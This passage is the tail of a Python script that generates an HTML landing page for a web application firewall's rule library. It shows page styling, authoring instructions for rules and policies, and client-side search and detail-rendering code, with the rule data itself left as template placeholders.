  .tag{{font:600 .7rem/1 var(--mono);padding:.3rem .5rem;border-radius:6px;text-transform:uppercase;letter-spacing:.03em}}
  .tag.block{{color:#fff;background:#b91c1c}} .tag.monitor{{color:#111;background:var(--warn)}}
  .tag.staged{{color:#111;background:#fcd34d}} .tag.enabled{{color:#052e2b;background:var(--safe)}}
  .tag.cat{{color:#c7d2fe;background:#171f38;border:1px solid #26304f}}
  .tag.sev{{color:#fff}} .tag.sev.critical{{background:#b91c1c}} .tag.sev.high{{background:#c2410c}}
  .tag.sev.medium{{background:#a16207}} .tag.sev.low{{background:#1d4ed8}}
  .tag.tgt{{color:var(--muted);background:#0c1424;border:1px solid var(--line)}}
  .kv{{display:grid;grid-template-columns:9rem 1fr;gap:.2rem .8rem;margin:.2rem 0 1rem;font-size:.9rem}}
  .kv dt{{color:var(--faint);font:.78rem/1.5 var(--mono);text-transform:uppercase;letter-spacing:.04em}}
  .kv dd{{margin:0}}
  .sec{{margin:1.1rem 0}} .sec h4{{margin:0 0 .35rem;font-size:.82rem;letter-spacing:.05em;text-transform:uppercase;color:var(--accent2)}}
  .sec p{{margin:0;color:var(--ink)}}
  pre{{background:#0a1120;border:1px solid var(--line);border-radius:10px;padding:.9rem 1rem;overflow-x:auto;
    font-family:var(--mono);font-size:.82rem;color:#d7def0;white-space:pre-wrap;word-break:break-word}}
  pre .c{{color:var(--faint)}}
  .refs{{display:flex;flex-wrap:wrap;gap:.35rem}}
  .refs span{{font:.74rem/1 var(--mono);color:var(--muted);background:#0c1424;border:1px solid var(--line);
    border-radius:6px;padding:.3rem .5rem}}
  /* featured intro */
  .feat{{border:1px solid #26304f;border-radius:16px;background:linear-gradient(180deg,#101a33,#0d1424);padding:1.6rem 1.7rem}}
  .feat h2{{font-size:1.7rem;margin:.4rem 0 .5rem}}
  .feat .lede{{color:var(--muted)}}
  .grid3{{display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;margin:1.1rem 0}}
  @media(max-width:680px){{.grid3{{grid-template-columns:1fr}}}}
  .mini{{background:#0c1424;border:1px solid var(--line);border-radius:12px;padding:.9rem}}
  .mini h4{{margin:0 0 .35rem;font-size:.92rem;color:#fff}} .mini p{{margin:0;color:var(--muted);font-size:.86rem}}
  .impacts{{display:flex;flex-wrap:wrap;gap:.4rem;margin:.4rem 0 1rem}}
  .impacts span{{font:600 .74rem/1 var(--mono);color:var(--danger);background:var(--danger-soft);
    border:1px solid #3a1d20;border-radius:6px;padding:.3rem .55rem}}
  .feat .sub{{font-size:.82rem;letter-spacing:.05em;text-transform:uppercase;color:var(--accent2);margin:1.1rem 0 .4rem}}
  ul.how{{margin:.2rem 0;padding-left:1.1rem}} ul.how li{{margin:.4rem 0;color:var(--ink)}}
  .foot{{color:var(--faint);font-size:.84rem;margin:.6rem 0 0}}
  footer.pg{{margin-top:2rem;border-top:1px solid var(--line);padding-top:1.3rem;color:var(--muted);font-size:.9rem}}
  footer.pg h3{{color:var(--ink);font-size:1rem;margin:0 0 .5rem}}
  footer.pg ol{{margin:.3rem 0 0;padding-left:1.2rem}} footer.pg li{{margin:.3rem 0}}
  .empty{{color:var(--faint);text-align:center;padding:2rem}}
</style>
</head>
<body>
<div class="wrap">
  <header class="top">
    <span class="eyebrow"><span class="dot"></span> WSLProxy WAF · OpenResty edge security</span>
    <h1>WAF <span class="g">Rule Library</span></h1>
    <p class="sub">Every rule the WSLProxy WAF ships — {n_sig} attack signatures and
    {n_stage} positive-security / protocol enforcement stages. Search, filter, and click
    any rule for what it detects, how the attack works, an example payload, how the engine
    catches it, and mitigation. Signatures evaluate per-request from JSON on disk; stages
    run before them in the request pipeline.</p>
    <div class="stats">
      <div class="stat"><b>{total}</b><span>rules total</span></div>
      <div class="stat"><b>{n_sig}</b><span>signatures</span></div>
      <div class="stat"><b>{n_stage}</b><span>enforcement stages</span></div>
      <div class="stat"><b>block</b><span>+ monitor · staged · governed</span></div>
    </div>
  </header>

  <div class="layout">
    <aside class="controls">
      <input id="q" class="search" placeholder="Search rules — sqli, jwt, smuggling, CWE-89…" autocomplete="off">
      <div class="chips" id="chips"></div>
      <div class="list" id="list"></div>
    </aside>
    <main class="detail" id="detail"></main>
  </div>

  <footer class="pg">
    <h3>How to implement a rule</h3>
    <ol>
      <li><b>Author a signature</b> — a JSON file under <code>data/waf_rules/&lt;env&gt;/&lt;id&gt;.json</code>
      with <code>id, name, category, severity, target, pattern, pattern_type, action, score</code>.
      Generate them with <code>examples/wslproxy-waf-demo/gen_waf_rules.py</code> so JSON escaping is correct,
      or POST to <code>/api/waf_rules</code>.</li>
      <li><b>Or add a stage</b> — a first-class control (like <code>smuggling</code> or <code>jwt</code>)
      is a <code>(policy, ctx) → finding|nil</code> function in <code>api/waf_stages.lua</code>, added to
      <code>_M.PIPELINE</code> and gated on a policy block so existing policies are unaffected.</li>
      <li><b>Bind to a policy</b> — reference the signature id in <code>waf_rules[]</code> (and configure the
      stage block) of a <code>data/waf_policies/&lt;env&gt;/&lt;id&gt;.json</code>; validate against
      <code>docs/waf-policy.schema.json</code> with <code>tools/waf_validate.py</code>.</li>
      <li><b>Attach to a server</b> — set <code>waf_enabled</code>, <code>waf_policy_id</code> and optional
      <code>waf_mode_override</code> on the vhost (or via the admin UI / <code>bind_waf_policy</code> MCP tool).</li>
      <li><b>Stage before you enforce</b> — ship new blocking rules under <code>signatures.stage</code>
      (alarm-only until a date), watch the <code>wafsec</code> logs, then let them enforce.</li>
    </ol>
    <p class="foot">Design reference: <code>docs/WAF_ENGINE_V2.md</code> · policy schema:
    <code>docs/waf-policy.schema.json</code> · live before/after demo: <code>dashboard.html</code>.
    Generated by <code>gen_waf_landing.py</code> from the shipped rule JSON — edit the generator, not this file.</p>
  </footer>
</div>

<script>
  const RULES = {data};
  const FEATURED = `{featured}`;
  const esc = s => String(s==null?"":s).replace(/[&<>]/g, c => ({{"&":"&amp;","<":"&lt;",">":"&gt;"}}[c]));
  const cats = [...new Set(RULES.map(r => r.category))].sort();
  let activeCat = "all", activeSel = null, query = "";

  const chipsEl = document.getElementById("chips");
  chipsEl.innerHTML = ['all', ...cats].map(c =>
    `<span class="chip${{c==='all'?' on':''}}" data-c="${{c}}">${{c==='all'?'all':esc(c)}}</span>`).join("");
  chipsEl.onclick = e => {{
    const c = e.target.closest(".chip"); if(!c) return;
    activeCat = c.dataset.c;
    [...chipsEl.children].forEach(x => x.classList.toggle("on", x.dataset.c===activeCat));
    render();
  }};
  document.getElementById("q").oninput = e => {{ query = e.target.value.toLowerCase().trim(); render(); }};

  function matches(r){{
    if(activeCat!=="all" && r.category!==activeCat) return false;
    if(!query) return true;
    const hay = (r.id+" "+r.name+" "+r.category+" "+r.summary+" "+(r.refs||[]).join(" ")+" "+(r.code||"")).toLowerCase();
    return hay.includes(query);
  }}

  function listItem(r){{
    return `<div class="row${{r.id===activeSel?' sel':''}}" data-id="${{r.id}}">
      <span class="sev ${{r.severity}}"></span>
      <div><div class="rname">${{r.featured?'<span class="star">★</span> ':''}}${{esc(r.name)}}</div>
        <div class="rmeta">${{esc(r.id)}} · ${{esc(r.category)}} · ${{esc(r.target)}}</div></div>
      <span class="kbadge ${{r.kind}}">${{r.kind}}</span>
    </div>`;
  }}

  function detailHtml(r){{
    const kv = [
      ["Rule id", `<code>${{esc(r.id)}}</code>`],
      ["Kind", r.kind==="signature" ? "Attack signature (regex, evaluated per request)" : "Enforcement stage (positive-security / protocol)"],
      ["Category", esc(r.category)],
      ["Inspects", `<code>${{esc(r.target)}}</code>`],
      ["Policy field", `<code>${{esc(r.field)}}</code>`],
      ["Violation", `<code>${{esc(r.code)}}</code>`],
      r.score!=null ? ["Anomaly score", String(r.score)] : null,
    ].filter(Boolean);
    const secs = [];
    if(r.summary) secs.push(["What it is", `<p>${{esc(r.summary)}}</p>`]);
    if(r.how) secs.push(["How the attack works", `<p>${{esc(r.how)}}</p>`]);
    if(r.example) secs.push(["Example", `<pre>${{esc(r.example)}}</pre>`]);
    if(r.pattern) secs.push(["Detection pattern", `<pre>${{esc(r.pattern)}}</pre>`]);
    if(r.mitigate) secs.push(["Mitigation", `<p>${{esc(r.mitigate)}}</p>`]);
    return `
      <span class="eyebrow"><span class="dot"></span> ${{r.kind==='signature'?'Signature':'Enforcement stage'}} · ${{esc(r.code)}}</span>
      <h2>${{r.featured?'★ ':''}}${{esc(r.name)}}</h2>
      <div class="badges">
        <span class="tag sev ${{r.severity}}">${{r.severity}}</span>
        <span class="tag ${{r.status}}">${{r.status}}</span>
        <span class="tag cat">${{esc(r.category)}}</span>
        <span class="tag tgt">inspects: ${{esc(r.target)}}</span>
      </div>
      <dl class="kv">${{kv.map(([k,v])=>`<dt>${{k}}</dt><dd>${{v}}</dd>`).join("")}}</dl>
      ${{secs.map(([h,b])=>`<div class="sec"><h4>${{h}}</h4>${{b}}</div>`).join("")}}
      ${{(r.refs&&r.refs.length)?`<div class="sec"><h4>References</h4><div class="refs">${{r.refs.map(x=>`<span>${{esc(x)}}</span>`).join("")}}</div></div>`:""}}
    `;
  }}

  function render(){{
    const shown = RULES.filter(matches);
    document.getElementById("list").innerHTML = shown.length
      ? shown.map(listItem).join("")
      : '<div class="empty">No rules match.</div>';
    const sel = RULES.find(r => r.id===activeSel);
    document.getElementById("detail").innerHTML = sel
      ? `<div>${{detailHtml(sel)}}</div>`
      : `<div class="feat">${{FEATURED}}</div>`;
  }}

  document.getElementById("list").onclick = e => {{
    const row = e.target.closest(".row"); if(!row) return;
    activeSel = row.dataset.id;
    location.hash = activeSel;
    render();
    document.getElementById("detail").scrollIntoView({{behavior:"smooth", block:"nearest"}});
  }};
  if(location.hash){{ const id = decodeURIComponent(location.hash.slice(1)); if(RULES.some(r=>r.id===id)) activeSel = id; }}
  render();
</script>
</body>
</html>
"""


if __name__ == "__main__":
    main()
